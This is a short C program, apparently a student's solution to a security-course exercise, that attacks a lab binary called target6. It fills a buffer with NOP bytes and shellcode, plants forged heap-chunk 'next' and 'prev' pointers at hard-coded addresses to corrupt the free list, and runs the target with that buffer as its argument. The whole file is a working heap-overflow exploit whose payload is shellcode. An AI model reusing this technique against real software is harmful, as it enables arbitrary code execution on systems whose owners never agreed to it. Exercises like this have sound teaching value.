#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target6"
#define BUFFER_SIZE 192

int main(void) {
        char *args[3];
        char *env[1];
        char exploit[BUFFER_SIZE];
        int i;

        args[0] = TARGET;
        args[1] = exploit;
        for (i = 0; i < BUFFER_SIZE; i++) {
                exploit[i] = 0x90;
        }

        // Set lowest bit to ensure that it is 'freed'
        exploit[4] = 0x91;
        memcpy(exploit + 8, shellcode, 45);

        //68 - 71 is next
        exploit[68 + 8] = 0x68;
        exploit[69 + 8] = 0xfe;
        exploit[70 + 8] = 0x21;
        exploit[71 + 8] = 0x20;

        //64 - 67 is prev
        exploit[64 + 8] = 0x28;
        exploit[65 + 8] = 0xee;
        exploit[66 + 8] = 0x04;
        exploit[67 + 8] = 0x01;

        args[2] = NULL;
        env[0] = NULL;

        if (0 > execve(TARGET, args, env))
                fprintf(stderr, "execve failed.\n");
        return 0;
}
